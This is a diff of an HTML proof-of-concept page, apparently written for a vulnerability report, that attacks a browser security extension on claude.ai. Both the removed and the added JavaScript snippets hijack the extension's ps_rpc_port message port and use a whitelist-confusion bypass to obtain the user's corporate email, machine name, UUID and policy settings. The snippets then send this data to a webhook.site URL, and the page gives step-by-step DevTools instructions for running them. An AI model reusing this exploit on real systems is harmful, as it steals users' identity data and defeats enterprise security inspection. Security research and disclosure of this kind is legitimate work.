@@ -38,68 +38,51 @@
     ⏳ Checking if port is available on this domain...
 </div>
 
-<!-- METHOD 1: IFRAME SUB-WINDOW -->
+<!-- METHOD 1: CONTENT SCRIPT BREAKPOINT -->
 <div class="step">
-<h3>METHOD 1 — Console Snippet on claude.ai <span class="tag bg-green">WORKS NOW — JUST 2 STEPS</span></h3>
+<h3>METHOD 1 — Content Script Breakpoint <span class="tag bg-green">WORKS — 7 STEPS</span></h3>
+<div class="warn" style="margin:6px 0 10px">
+  ⚠️ <b>Why iframe failed:</b> claude.ai returns <code>X-Frame-Options: DENY</code> — the iframe loads a Chrome error page, content script never injects, port never fires.<br><br>
+  ✅ <b>Fix:</b> Set a breakpoint directly inside the extension's content script <em>right before</em> <code>ps_rpc_port</code> fires. This gives us a window to register our listener.
+</div>
 <ol>
-    <li>Open <b>https://claude.ai</b> — let it load fully until you see the chat interface</li>
-    <li>Press <kbd>F12</kbd> → <b>Console</b> tab → paste the snippet below → press <kbd>Enter</kbd></li>
-    <li>Wait 3 seconds — check the Console for <code style="color:lime">[PS-STEAL] EMAIL:</code> and check webhook.site</li>
+    <li>Open a <b>new tab</b> → navigate to <b>https://claude.ai</b> with DevTools open (<kbd>F12</kbd>)</li>
+    <li>In DevTools → <b>Sources</b> tab → press <kbd>Ctrl+Shift+F</kbd> to open global search</li>
+    <li>Search for <code>ps_rpc_port</code> → click the result to open <b>content.bundle.js</b></li>
+    <li>Find the line containing <code>window.postMessage({ps_rpc_port</code> → click the <b>line number</b> to set a blue breakpoint dot</li>
+    <li>Press <kbd>Ctrl+R</kbd> to reload — DevTools will pause on that exact line</li>
+    <li>Switch to <b>Console</b> tab → paste the snippet below → press <kbd>Enter</kbd> (this registers the listener while paused)</li>
+    <li>Press <kbd>F8</kbd> (Resume) → port fires → listener captures it → check Console + webhook.site</li>
 </ol>
-<p style="color:#888;font-size:12px;margin:6px 0 8px">
-    <b>How it works:</b> Creates a hidden same-origin iframe pointing to <code>claude.ai</code>.
-    The extension injects a fresh content script into the iframe, which fires a NEW <code>ps_rpc_port</code> handshake.
-    We intercept that port on the iframe's window (same origin = we can access it), then use the
-    whitelist confusion bypass to call <code>getSiteActionConfig</code> → returns your corporate email.
-</p>
-<pre id="s1">(function(){
-  var W = "https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039";
-
-  var f = document.createElement("iframe");
-  f.style.cssText = "position:fixed;top:-999px;left:-999px;width:1px;height:1px;";
-  document.body.appendChild(f);
-
-  /* Listen on the iframe window for ps_rpc_port BEFORE navigating it.
-     Same-origin access: we can read/write f.contentWindow freely. */
-  f.contentWindow.addEventListener("message", function H(e) {
-    if (!e.data || e.data.ps_rpc_port !== true || !e.ports || !e.ports[0]) return;
-    f.contentWindow.removeEventListener("message", H);
-    var port = e.ports[0], token = e.data.token, id = crypto.randomUUID();
-    port.start();
-    console.log("%c[PS-STEAL] Port intercepted!", "color:lime;font-weight:bold");
-
-    port.onmessage = function(r) {
-      if (r.data.messageId !== id) return;
-      var ui = r.data.response && r.data.response.userInfo;
-      console.log("%c[PS-STEAL] EMAIL: " + (ui&&ui.email), "color:lime;font-size:16px;font-weight:bold");
-      console.log("[PS-STEAL] MACHINE: " + (ui&&ui.machineName) + " | UUID: " + (ui&&ui.userUUID));
-      navigator.sendBeacon(W, new Blob([JSON.stringify({
-        phase:2, method:"iframe_sub_window", origin:location.origin,
+<pre id="s1">/* PASTE IN CONSOLE WHILE PAUSED AT THE BREAKPOINT */
+window.addEventListener("message", function H(e) {
+  if (!e.data || e.data.ps_rpc_port !== true || !e.ports || !e.ports[0]) return;
+  window.removeEventListener("message", H);
+  var port = e.ports[0], token = e.data.token, id = crypto.randomUUID();
+  port.start();
+  console.log("%c[PS-STEAL] Port captured!", "color:lime;font-weight:bold");
+  port.onmessage = function(r) {
+    if (r.data.messageId !== id) return;
+    var ui = r.data.response && r.data.response.userInfo;
+    console.log("%c[PS-STEAL] EMAIL: " + (ui&&ui.email), "color:lime;font-size:16px;font-weight:bold");
+    console.log("[PS-STEAL] MACHINE: " + (ui&&ui.machineName) + " | UUID: " + (ui&&ui.userUUID));
+    navigator.sendBeacon("https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039",
+      JSON.stringify({
+        phase:2, method:"content_script_breakpoint", origin:location.origin,
         email: ui&&ui.email, profileEmail: ui&&ui.profileEmail,
         machineName: ui&&ui.machineName, userUUID: ui&&ui.userUUID,
         identitySource: ui&&ui.identitySource,
-        orgPolicy: r.data.response&&{
-          globalCanBypass: r.data.response.globalSettingsCanBypassInspection,
-          ignoredDomains: r.data.response.ignoredDomains,
-          domainActions: r.data.response.domainActions
-        }
-      })], {type:"application/json"}));
-    };
-
-    /* BYPASS A: content script whitelist checks e.message = "callProtectApi" ✓
-       Background dispatches on e.type || e.message → type wins → "getSiteActionConfig" */
-    port.postMessage({token:token, messageId:id, message:{
-      message:"callProtectApi",
-      type:"getSiteActionConfig",
-      domain:location.hostname,
-      ctx:{flowTraceId:crypto.randomUUID()}
-    }});
-  });
-
-  /* Navigate iframe to trigger fresh content script injection + port setup */
-  f.src = location.href;
-  console.log("[PS-STEAL] Iframe injected. Waiting for port (~2-3s)...");
-})();
+        domainActions: r.data.response&&r.data.response.domainActions
+      }));
+  };
+  /* BYPASS A: whitelist checks e.message="callProtectApi" ✓
+     background routes on type="getSiteActionConfig" → returns email */
+  port.postMessage({token:token, messageId:id, message:{
+    message:"callProtectApi", type:"getSiteActionConfig",
+    domain:location.hostname, ctx:{flowTraceId:crypto.randomUUID()}
+  }});
+});
+console.log("[PS-STEAL] Listener ready — press F8 now");
 <button class="copy" onclick="cp('s1')">Copy</button></pre>
 </div>
 
